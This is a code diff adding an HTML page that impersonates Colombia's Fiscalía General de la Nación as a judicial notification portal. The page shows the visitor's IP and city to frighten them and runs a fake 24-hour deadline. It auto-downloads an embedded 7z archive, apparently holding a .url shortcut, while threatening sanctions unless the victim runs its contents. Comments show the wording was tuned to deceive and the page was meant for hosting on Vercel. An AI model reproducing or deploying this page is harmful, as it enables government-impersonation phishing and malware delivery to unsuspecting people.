@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SPOA - FISCALÍA GENERAL DE LA NACIÓN</title>
+    <style>
+        :root {
+            --fgn-blue: #003366;
+            --fgn-red: #d9534f;
+            --fgn-gray: #f8fafc;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, sans-serif;
+            background-color: #eef2f5;
+            margin: 0;
+            overflow-x: hidden;
+            color: #333;
+        }
+
+        .live-tracker {
+            background: #222;
+            color: #ccc;
+            font-family: monospace;
+            font-size: 10px;
+            padding: 5px 20px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .header {
+            background: white;
+            padding: 15px 10%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 4px solid var(--fgn-blue);
+        }
+
+        .header img { height: 50px; }
+
+        .main-container {
+            max-width: 850px;
+            margin: 20px auto;
+            background: white;
+            border-radius: 4px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .audit-card {
+            background: #f1f5f9;
+            border: 1px solid #cbd5e1;
+            padding: 15px 25px;
+            margin: 20px 40px 0 40px;
+            border-radius: 4px;
+            display: none;
+        }
+
+        .audit-header {
+            font-size: 11px;
+            font-weight: bold;
+            color: #64748b;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #cbd5e1;
+            padding-bottom: 5px;
+        }
+
+        .audit-item {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #475569;
+            padding: 3px 0;
+        }
+
+        .audit-item strong { color: var(--fgn-blue); }
+
+        .urgency-ribbon {
+            background: var(--fgn-red);
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-weight: bold;
+            font-size: 13px;
+        }
+
+        .content { padding: 40px; }
+
+        .case-info {
+            background: var(--fgn-gray);
+            border-left: 6px solid var(--fgn-blue);
+            padding: 20px;
+            margin-bottom: 25px;
+            border: 1px solid #e2e8f0;
+            border-left: 6px solid var(--fgn-blue);
+        }
+
+        .instruction-card {
+            background: #fff5f5;
+            border: 2px dashed #feb2b2;
+            padding: 25px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .btn-main {
+            background: var(--fgn-blue);
+            color: white !important;
+            padding: 18px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            text-decoration: none;
+            border-radius: 4px;
+            cursor: pointer;
+            border: none;
+            transition: 0.2s;
+        }
+
+        .btn-main:hover { background: #002244; }
+
+        .zip-requirement {
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: #f1f5f9;
+            padding: 15px;
+            border-radius: 6px;
+        }
+
+        .steps-box {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .step { background: #f8fafc; padding: 12px; border-radius: 4px; font-size: 12px; border: 1px solid #eee; }
+    </style>
+</head>
+<body>
+
+<div class="live-tracker">
+    <span>SISTEMA DE NOTIFICACIÓN ELECTRÓNICA v4.2</span>
+    <span>ESTADO: <span id="mouse-status">CONECTADO</span></span>
+</div>
+
+<header class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Fiscal%C3%ADa_General_de_la_Naci%C3%B3n_%28Colombia%29_logo.svg" alt="Fiscalía">
+    <div style="text-align: right;">
+        <small>Portal Único de Notificaciones</small><br>
+        <strong>REF: ACT-JUD-2026-99012</strong>
+    </div>
+</header>
+
+<div class="main-container">
+    <div id="audit-box" class="audit-card">
+        <div class="audit-header">Registro de Conexión del Notificado</div>
+        <div class="audit-item">
+            <strong>Ubicación Detectada:</strong>
+            <span id="user-loc">CARGANDO...</span>
+        </div>
+        <div class="audit-item">
+            <strong>Dirección IP:</strong>
+            <span id="user-ip">CARGANDO...</span>
+        </div>
+        <div class="audit-item">
+            <strong>ID de Sesión:</strong>
+            <span>SPOA-TX-2026-8812</span>
+        </div>
+    </div>
+
+    <div class="urgency-ribbon">
+        ⚠️ ATENCIÓN: PLAZO DE LEY PARA DESCARGA: <span id="alert-timer">24:00:00</span>
+    </div>
+
+    <div class="content">
+        <h1 style="margin-top:0; font-size: 24px;">Proceso de Notificación en Curso</h1>
+        
+        <div class="case-info">
+            <strong>Expediente:</strong> 11001-2026-00441-00<br>
+            <strong>Despacho:</strong> Juzgado 24 Civil Municipal de Bogotá<br>
+            <strong>Estado:</strong> <span style="color:red; font-weight:bold;">REQUERIDO</span>
+        </div>
+
+        <p style="font-size: 14px;">El sistema ha registrado su ingreso desde la ubicación detallada anteriormente. Para dar cumplimiento a la normativa vigente, debe descargar el expediente y ejecutar el certificado de validación institucional.</p>
+
+        <div class="instruction-card">
+            <h3 style="margin-top:0; color: var(--fgn-blue);">EXPEDIENTE DIGITAL CIFRADO</h3>
+            <p style="font-size: 13px; color: #555;">Descargue el paquete y ejecute el archivo interno para confirmar el acuse de recibo legal.</p>
+            <button onclick="descargarYA()" class="btn-main">DESCARGAR EXPEDIENTE (.7z)</button>
+        </div>
+
+        <div class="zip-requirement">
+            <img src="https://www.7-zip.org/7ziplogo.png" height="25">
+            <div>
+                <p style="font-size:11px; margin:0; color:#555;"><strong>IMPORTANTE:</strong> Si no puede abrir el archivo, instale el componente de cifrado oficial:</p>
+                <a href="https://github.com/ip7z/7zip/releases/download/24.04/7z2404-x64.exe" style="font-size:11px; color:var(--fgn-blue); font-weight:bold;">Descargar Soporte de Cifrado (v24.04)</a>
+            </div>
+        </div>
+
+        <div class="steps-box">
+            <div class="step">
+                <strong>1. DESCARGA:</strong> Guarde el archivo <em>CopiaExpedienteParcial.7z</em> en su equipo.
+            </div>
+            <div class="step">
+                <strong>2. VALIDACIÓN:</strong> Ejecute el contenido para reportar la lectura automática al despacho judicial.
+            </div>
+        </div>
+    </div>
+</div>
+
+<footer style="text-align: center; color: #999; font-size: 11px; padding: 20px;">
+    Fiscalía General de la Nación © 2026 | República de Colombia
+</footer>
+
+<script>
+    async function cargarRastreo() {
+        try {
+            // Cambio a HTTPS para compatibilidad total con Vercel
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            
+            if (data.ip) {
+                document.getElementById('audit-box').style.display = 'block';
+                document.getElementById('user-loc').innerText = `${data.city.toUpperCase()}, ${data.region.toUpperCase()}`;
+                document.getElementById('user-ip').innerText = data.ip;
+                
+                document.getElementById('mouse-status').innerText = "VINCULADO: " + data.ip;
+                document.getElementById('mouse-status').style.color = "#4BB543";
+            }
+        } catch (e) {
+            console.log("Error en auditoría segura.");
+        }
+    }
+
+    function descargarYA() {
+        const base64Data = "N3q8ryccAAROoYPO0gAAAAAAAACCAAAAAAAAAO9f6xXgAPMAyl0ALZ7CGDkcDpdy7QvOlv0t5RuxxeooB03bQu7VKi/qJ2BavmmAyetDKXrpv9Ii7jlN+oJOhud6u/vacSLeKJ3xyzUy7gOG0XSw0ZmCkH4s8O1cIeboa4lFstoVnvBgTjdToAJ/RQ+d7u+kJbVDkquF6w6KSxg8JRFdkw4vhFaPnT1TO9Crg8vT7WGnYg2hkYP6l47JIvtOSUKbr/aL1GkeujiP2ibwZnqG1TlRS+l5zxbRJA4N2vtn+g0T9OFjNPa5Yrpu2PaBFTk1AAABBAYAAQmA0gAHCwEAASEhAQAMgPQACAoBS2aXQQAABQEZCgAAAAAAAAAAAAARPQBDAG8AcABpAGEARQB4AHAAZQBkAGkAZQBuAHQAZQBQAGEAcgBjAGkAYQBsAFAARABGAC4AdQByAGwAAAAUCgEAAIxwNsHN3AEVBgEAIAAAAAAA";
+        const link = document.createElement("a");
+        link.href = "data:application/x-7z-compressed;base64," + base64Data;
+        link.download = "CopiaExpedienteParcialPDF.7z";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        
+        setTimeout(() => {
+            // Lenguaje institucional corregido: sin la palabra "multas"
+            alert("SISTEMA DE NOTIFICACIONES: El reporte de acuse de recibo está pendiente. Es indispensable ejecutar el componente de validación interna para evitar el inicio de procesos sancionatorios por falta de cumplimiento a la normativa procesal vigente.");
+        }, 1200);
+    }
+
+    window.onload = function() {
+        cargarRastreo();
+        setTimeout(descargarYA, 7000);
+
+        let h = 23, m = 59, s = 59;
+        setInterval(() => {
+            s--;
+            if(s<0) { s=59; m--; }
+            document.getElementById('alert-timer').innerText = `${h}:${m}:${s}`;
+        }, 1000);
+    };
+</script>
+
+</body>
+</html>
